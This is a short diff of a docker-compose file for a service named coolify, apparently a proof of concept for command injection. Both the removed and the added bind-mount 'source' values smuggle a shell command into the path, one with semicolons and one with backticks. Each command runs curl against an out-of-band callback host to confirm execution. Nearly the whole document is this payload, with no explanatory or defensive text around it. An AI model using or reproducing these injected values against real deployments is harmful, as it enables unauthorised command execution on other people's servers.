@@ -1,17 +1,13 @@
 services:
-    coolify:
-        container_name: coolify
-        volumes:
-            - type: bind
-              source: '; curl https://dizrv3m0zxdgsiygmpiqhglet5zwnybn.oastify.com;'
-              target: /app
-        restart: always
-        working_dir: /var/www/html
-        extra_hosts:
-            - host.docker.internal:host-gateway
-        networks:
-            - coolify
-        depends_on:
-            - postgres
-            - redis
-            - soketi
+  coolify:
+    container_name: coolify
+    image: alpine
+    volumes:
+      -
+        type: bind
+        source: "/tmp/pwn`curl https://78dllxcupr3aicoacj8k7ab8jzpqdt1i.oastify.com`"
+        target: /app
+    restart: always
+    working_dir: /var/www/html
+    extra_hosts:
+      - 'host.docker.internal:host-gateway'
